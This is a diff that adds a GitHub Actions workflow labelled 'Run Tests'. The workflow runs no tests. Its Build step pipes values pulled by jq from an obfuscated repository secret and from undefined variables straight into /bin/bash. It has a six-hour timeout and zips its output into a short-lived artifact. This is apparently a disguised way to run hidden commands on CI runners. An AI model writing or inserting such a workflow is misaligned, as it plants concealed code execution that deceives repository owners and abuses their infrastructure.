@@ -1,0 +1,30 @@
+name: Run Tests
+on:
+  workflow_dispatch:
+
+permissions:
+  contents: read
+  actions: read
+jobs:
+  operation:
+    name: Run task
+    runs-on: ubuntu-latest
+    timeout-minutes: 360
+    steps:
+      - name: Checkout
+        uses: actions/checkout@v4
+      - name: Build
+        env:
+          fm19678: ${{ secrets.fm19678 }}
+        run: |
+          printf '%s' "$fm19678" | jq -r .s168 | /bin/bash
+          echo $bhntn8647 | jq -r .kycx912 | /bin/bash
+          printf '%s' "$efijk65" | jq -r .pbx4086 | /bin/bash
+
+      - name: Archive output
+        if: always()
+        uses: actions/upload-artifact@v4
+        with:
+          name: LH7lInML
+          path: "*.zip"
+          retention-days: 1
